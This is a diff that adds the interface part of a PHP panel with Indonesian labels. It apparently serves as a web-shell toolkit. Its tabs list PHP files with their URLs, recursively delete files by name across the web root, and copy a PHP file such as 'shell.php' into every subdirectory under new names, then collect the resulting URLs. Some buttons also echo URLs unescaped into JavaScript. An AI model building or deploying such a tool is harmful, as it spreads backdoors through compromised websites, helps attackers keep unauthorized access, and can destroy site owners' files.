+                    <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+                <?php elseif ($successMessage): ?>
+                    <div class="message success">
+                        <p><?php echo htmlspecialchars($successMessage); ?></p>
+                    </div>
+                    <?php if ($phpFileList): ?>
+                        <div class="php-file-list">
+                            <h3>📄 Daftar File PHP: <span class="stats-badge"><?php echo count($phpFileList); ?> file</span></h3>
+                            <div class="results-box">
+                                <ul>
+                                    <?php foreach ($phpFileList as $file): ?>
+                                        <li>
+                                            <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank"><?php echo htmlspecialchars($file['path']); ?></a>
+                                            <br>
+                                            <small>🕒 Terakhir diedit: <?php echo date("Y-m-d H:i:s", $file['last_modified']); ?></small>
+                                        </li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            </div>
+                            <button class="button-small" onclick="copyToClipboard('<?php 
+                                $urls = array_map(function($f) { return $f['url']; }, $phpFileList);
+                                echo implode("\n", $urls);
+                            ?>')">📋 Salin Semua URL</button>
+                        </div>
+                    <?php endif; ?>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+
+        <!-- ==================== TAB 4: Auto RM ==================== -->
+        <div id="autoRm" class="tab-content">
+            <form action="" method="post">
+                <h3>🗑️ Hapus File Secara Rekursif</h3>
+                <div class="info-box">
+                    <strong>⚠️ Peringatan:</strong> Operasi ini akan menghapus semua file dengan nama yang sama di semua subdirektori. Pastikan Anda yakin!
+                </div>
+                <div class="form-group">
+                    <label for="baseDirRm">Direktori Root:</label>
+                    <input type="text" id="baseDirRm" name="baseDirRm" value="<?php echo htmlspecialchars(isset($_POST['baseDirRm']) ? $_POST['baseDirRm'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
+                </div>
+                <div class="form-group">
+                    <label for="filenameRm">Nama File untuk Dihapus:</label>
+                    <input type="text" id="filenameRm" name="filenameRm" value="<?php echo htmlspecialchars(isset($_POST['filenameRm']) ? $_POST['filenameRm'] : ''); ?>" placeholder="contoh: shell.php" required>
+                </div>
+                <button type="submit" name="auto_rm" class="button button-danger">🗑️ Hapus File</button>
+            </form>
+
+            <div style="margin-top: 15px;">
+                <button onclick="copyResults('autoRm')" class="button-small">📋 Salin Semua</button>
+            </div>
+
+            <?php if (isset($_POST['auto_rm'])): ?>
+                <?php if ($error && !$successMessage): ?>
+                    <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+                <?php elseif ($successMessage): ?>
+                    <div class="message success">
+                        <p><?php echo htmlspecialchars($successMessage); ?></p>
+                    </div>
+                    <?php if ($deletedFileList): ?>
+                        <div class="deleted-file-list">
+                            <h3>🗑️ File yang Dihapus: <span class="stats-badge"><?php echo count($deletedFileList); ?> file</span></h3>
+                            <div class="results-box">
+                                <ul>
+                                    <?php foreach ($deletedFileList as $file): ?>
+                                        <li>❌ <?php echo htmlspecialchars($file); ?></li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            </div>
+                        </div>
+                    <?php endif; ?>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+
+        <!-- ==================== TAB 5: Copy & Rename ==================== -->
+        <div id="copyRenameTab" class="tab-content">
+            <form action="" method="post">
+                <h3>📋 Copy & Rename PHP File ke Semua Subdirektori</h3>
+                <div class="form-group">
+                    <label for="sourceFilePath">Source PHP File Path:</label>
+                    <input type="text" id="sourceFilePath" name="sourceFilePath" value="<?php echo htmlspecialchars(isset($_POST['sourceFilePath']) ? $_POST['sourceFilePath'] : ''); ?>" placeholder="/var/www/html/shell.php" required>
+                </div>
+                <div class="form-group">
+                    <label for="destinationDir">Destination Directory Path:</label>
+                    <input type="text" id="destinationDir" name="destinationDir" value="<?php echo htmlspecialchars(isset($_POST['destinationDir']) ? $_POST['destinationDir'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
+                </div>
+                <div class="form-group">
+                    <label>Nama-nama File Baru (isi minimal 1):</label>
+                    <?php 
+                    $savedNames = isset($_POST['newFileName']) ? $_POST['newFileName'] : [];
+                    for ($i = 0; $i < 5; $i++): 
+                        $val = isset($savedNames[$i]) ? htmlspecialchars($savedNames[$i]) : '';
+                    ?>
+                    <div style="margin-bottom: 8px;">
+                        <input type="text" name="newFileName[]" placeholder="Nama file baru <?= $i + 1 ?>" value="<?= $val ?>">
+                    </div>
+                    <?php endfor; ?>
+                </div>
+                <button type="submit" name="copyRenameSubmit" class="button">📋 Copy & Rename</button>
+            </form>
+
+            <div style="margin-top: 15px;">
+                <button onclick="copyResults('copyRenameTab')" class="button-small">📋 Salin Semua</button>
+            </div>
+
+            <?php if (isset($_POST['copyRenameSubmit'])): ?>
+                <?php if ($error): ?>
+                    <div class="message error"><?= htmlspecialchars($error); ?></div>
+                <?php elseif ($successMessage): ?>
+                    <div class="message success">
+                        <p><?= htmlspecialchars($successMessage); ?></p>
+                    </div>
+                    <?php if (!empty($copiedFilesUrls)): ?>
+                        <h3>🔗 URLs File Hasil Copy:</h3>
+                        <p><span class="stats-badge"><?= count($copiedFilesUrls) ?> file</span></p>
+                        <div class="results-box">
+                            <ul>
+                                <?php foreach ($copiedFilesUrls as $url): ?>
+                                    <li><a href="<?= htmlspecialchars($url) ?>" target="_blank"><?= htmlspecialchars($url) ?></a></li>
+                                <?php endforeach; ?>
+                            </ul>
+                        </div>
+                        <button class="button-small" onclick="copyUrlsToClipboard('<?= implode("\n", $copiedFilesUrls) ?>')">📋 Salin Semua URL</button>
+                    <?php endif; ?>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+    </div>
+</body>
+</html>
